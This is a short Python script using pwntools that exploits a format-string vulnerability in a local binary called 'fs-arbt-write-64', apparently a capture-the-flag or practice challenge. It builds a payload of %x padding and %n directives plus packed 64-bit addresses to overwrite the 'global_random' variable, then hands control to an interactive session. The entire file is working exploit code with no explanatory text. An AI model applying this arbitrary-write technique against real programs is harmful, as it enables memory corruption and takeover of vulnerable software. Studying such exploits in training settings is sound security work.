#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-write-64')

glob_rand = p.elf.symbols['global_random']

e1 = 0xb00c
e2 = 0xface

# %12345x%9$n%12345x%10$n [padding] [8-byte-address][8-byte-address+2]

buf = "%" + str(e1) + "x%10$n" + "%" + str(e2-e1) + "x%11$n" + "AAAAAAAA" + p64(glob_rand) + p64(glob_rand+2)

p.sendline(buf)

p.interactive()
